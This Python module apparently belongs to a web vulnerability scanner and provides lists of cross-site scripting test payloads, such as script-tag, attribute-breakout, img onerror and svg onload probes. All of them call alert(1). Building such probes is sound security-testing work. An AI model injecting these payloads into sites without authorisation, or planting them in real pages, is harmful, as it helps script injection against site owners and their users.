"""
===============================================================================
Cross-Site Scripting Payload Provider

Responsible only for generating XSS payloads.

No HTTP requests.
No detection.
No validation.
===============================================================================
"""

from __future__ import annotations

from itertools import chain
from typing import Iterable


REFLECTED_PAYLOADS = (
    "<script>alert(1)</script>",
    "\"><script>alert(1)</script>",
    "'><script>alert(1)</script>",
)

ATTRIBUTE_PAYLOADS = (
    "\" onmouseover=\"alert(1)",
    "' onmouseover='alert(1)",
)

IMAGE_PAYLOADS = (
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
)

EVENT_PAYLOADS = (
    "<body onload=alert(1)>",
    "<details open ontoggle=alert(1)>",
)

PAYLOAD_DATABASE = {
    "reflected": REFLECTED_PAYLOADS,
    "attribute": ATTRIBUTE_PAYLOADS,
    "image": IMAGE_PAYLOADS,
    "event": EVENT_PAYLOADS,
}


class XSSPayloadProvider:

    def generate(
        self,
        vector,
    ) -> Iterable[str]:

        return chain.from_iterable(
            PAYLOAD_DATABASE.values()
        )

    def get_category(
        self,
        category: str,
    ):

        return PAYLOAD_DATABASE.get(
            category.lower(),
            (),
        )